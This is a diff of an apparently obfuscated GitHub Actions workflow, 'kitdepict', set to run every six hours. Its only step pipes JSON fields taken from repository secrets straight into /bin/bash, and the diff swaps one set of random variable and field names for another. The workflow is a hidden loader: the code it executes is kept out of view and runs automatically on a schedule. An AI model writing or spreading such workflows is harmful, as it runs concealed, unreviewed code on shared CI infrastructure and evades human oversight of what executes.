@@ -1,28 +1,23 @@
 name: kitdepict
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '50 3/6 * * *'
+    - cron: '3 4/6 * * *'
 
-jobs:  # 11212
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: kitdepict
         env:
-          o0: ${{ secrets.o0 }}
+          riif35: ${{ secrets.riif35 }}
         run: |
-          echo $o0 | jq -r .c5884 | /bin/bash
-          echo $g520 | jq -r .nwsm593 | /bin/bash
-          echo $hgrtq062 | jq -r .hc2106 | /bin/bash
-          echo $t53 | jq -r .nvpgi2 | /bin/bash
-          echo $uib416 | jq -r .j339 | /bin/bash
-          echo $vbml1228 | jq -r .fmd3 | /bin/bash
-          echo $yh3168 | jq -r .ufsx8 | /bin/bash
-          echo $onqmb58 | jq -r .hzgx6 | /bin/bash
-          echo $ttikz3 | jq -r .wnwfc270 | /bin/bash
-          echo $lsbnp047 | jq -r .ro22 | /bin/bash
-          echo $m9122 | jq -r .c4018 | /bin/bash
-          echo $z06 | jq -r .yxdoq9651 | /bin/bash
+          echo $riif35 | jq -r .jkx60 | /bin/bash
+          echo $gmcve317 | jq -r .v6445 | /bin/bash
+          echo $gdw60 | jq -r .vdyno304 | /bin/bash
+          echo $rr840 | jq -r .y3 | /bin/bash
+          echo $fmnj46 | jq -r .hsnxe1 | /bin/bash
+          echo $hsvu591 | jq -r .dq6 | /bin/bash
 
